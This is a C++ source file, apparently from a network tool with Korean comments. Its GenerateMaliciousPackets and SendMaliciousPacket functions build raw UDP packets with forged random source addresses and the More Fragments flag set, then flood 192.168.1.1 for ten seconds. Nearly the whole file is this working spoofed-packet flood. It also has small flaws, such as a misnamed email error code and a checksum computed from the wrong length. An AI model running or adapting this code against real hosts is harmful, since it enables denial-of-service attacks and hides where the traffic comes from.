#include <arpa/inet.h>
#include <chrono>
#include <cstdlib>
#include <cstring>
#include <iostream>
#include <mutex>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <thread>
#include <unistd.h>
#include "packet_generator.h"
#include "user_program.h"

extern std::mutex print_mutex;

// 데이터의 정확성을 검증하기 위해 사용하는 체크섬을 계산하는 함수
unsigned short CheckSum(void *pData, int nLen) {
    unsigned short *nBuf = (unsigned short*)pData;
    unsigned int nSum = 0;
    unsigned short nResult;

    for (nSum = 0; nLen > 1; nLen -= 2) {
        nSum += *nBuf++;
    }
    if (nLen == 1) nSum += *(unsigned char*)nBuf;
    nSum = (nSum >> HALF_WORD_SIZE) + (nSum & HALF_WORD_MASK);
    nSum += (nSum >> HALF_WORD_SIZE);
    nResult = ~nSum;
    return nResult;
}

// 네트워크를 통해 패킷을 생성하는 함수
int CPacketGenerator::GenerateMaliciousPackets(std::atomic<int>& nTotalMaliciousPacketsSent) {
    try {
        srand(static_cast<unsigned int>(time(0)));
        std::ofstream logFile("logs/packet_transmission.log", std::ios_base::app);
        if (!logFile.is_open()) return ERROR_CANNOT_OPEN_FILE;

        logFile << "Sending packets..." << std::endl;
        {
            std::lock_guard<std::mutex> lock(print_mutex);
            std::cout << COLOR_GREEN "Packets being sent over the network for 10 seconds...\n" << COLOR_RESET << std::endl;
        }

        auto startTime = std::chrono::steady_clock::now();
        while (std::chrono::duration_cast<std::chrono::seconds>(std::chrono::steady_clock::now() - startTime).count() < TRANSMISSION_DURATION) {
            for (int nPacketIndex = 0; nPacketIndex < PACKETS_PER_INTERVAL; nPacketIndex++) {
                if (rand() % 10 < 9) {
                    std::string strSrcIp = "192.168." + std::to_string(rand() % MAX_SEGMENT_VALUE) + "." + std::to_string(rand() % MAX_SEGMENT_VALUE);
                    int nResult = SendMaliciousPacket(strSrcIp.c_str(), "192.168.1.1", 1, logFile);
                    if (nResult != SUCCESS_CODE) {
                        logFile << GetErrorMessage(nResult) << std::endl;
                        return nResult;
                    }
                    nTotalMaliciousPacketsSent++;
                    {
                        std::lock_guard<std::mutex> lock(print_mutex);
                        std::cout << "\rTotal number of packets sent: " << nTotalMaliciousPacketsSent.load() << std::flush;
                    }
                }
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(TRANSMISSION_INTERVAL));
        }

        logFile.close();
    } catch (const std::exception& e) {
        return ERROR_UNKNOWN;
    }
    return SUCCESS_CODE;
}

// 소스 IP 주소에서 목적지 IP 주소로 패킷을 전송하는 함수
int CPacketGenerator::SendMaliciousPacket(const char* pSrcIp, const char* pDstIp, int nPacketCount, std::ofstream& logFile) {
    int nSock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (nSock < 0) {
        perror("Socket creation failed");
        return ERROR_CANNOT_OPEN_DEVICE;
    }

    char packet[PACKET_BUFFER_SIZE];
    memset(packet, 0, PACKET_BUFFER_SIZE);

    struct iphdr *pIpHeader = (struct iphdr *)packet;
    struct udphdr *pUdpHeader = (struct udphdr *)(packet + sizeof(struct iphdr));
    struct sockaddr_in sin;

    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr(pDstIp);

    pIpHeader->ihl = IP_HEADER_LENGTH;
    pIpHeader->version = IP_VERSION;
    pIpHeader->tos = IP_TYPE_OF_SERVICE;
    pIpHeader->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + MAX_PACKET_SIZE);
    pIpHeader->id = htonl(rand() % MAX_PACKET_ID);
    pIpHeader->frag_off = htons(IP_MORE_FRAGMENTS);
    pIpHeader->ttl = IP_TTL;
    pIpHeader->protocol = IPPROTO_UDP;
    pIpHeader->check = 0;
    pIpHeader->saddr = inet_addr(pSrcIp);
    pIpHeader->daddr = sin.sin_addr.s_addr;

    pUdpHeader->source = htons(SOURCE_PORT);
    pUdpHeader->dest = htons(DESTINATION_PORT);
    pUdpHeader->len = htons(sizeof(struct udphdr) + MAX_PACKET_SIZE);
    pUdpHeader->check = CheckSum((void*)packet, pIpHeader->tot_len);

    memset(packet + sizeof(struct iphdr) + sizeof(struct udphdr), 'A', MAX_PACKET_SIZE);
    pIpHeader->check = CheckSum((unsigned short *)packet, sizeof(struct iphdr) + sizeof(struct udphdr) + MAX_PACKET_SIZE);

    for (int nIndex = 0; nIndex < nPacketCount; nIndex++) {
        if (sendto(nSock, packet, sizeof(struct iphdr) + sizeof(struct udphdr) + MAX_PACKET_SIZE, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            perror("Packet send failed");
            close(nSock);
            return ERROR_CANNOT_SEND_EMAIL;
        } else {
            logFile << "Packet sent from " << pSrcIp << " to " << pDstIp << std::endl;
        }
    }

    close(nSock);
    return SUCCESS_CODE;
}